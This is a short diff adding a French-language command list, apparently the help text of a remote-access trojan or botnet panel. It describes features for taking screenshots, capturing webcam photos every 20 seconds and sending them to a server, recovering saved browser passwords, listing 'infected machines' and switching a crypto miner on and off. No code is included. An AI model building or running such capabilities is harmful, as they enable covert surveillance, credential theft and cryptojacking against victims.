@@ -1,0 +1,9 @@
+screenshot = prend un screen lol
+cam-on = prend des photo de la cam toute les 20s et les envoie au serveur
+cam-off = stop le proc
+password = recup les password enregistrée de ton navigateur préferée !
+cd = ce déplacer dans les dossier 
+ls = (dir pour windows) liste les fichier dans un dossier
+list = liste toute les machines infectée 
+crypto-on = active le mineur de crypto
+crypto-off = desac le mineur de crypto
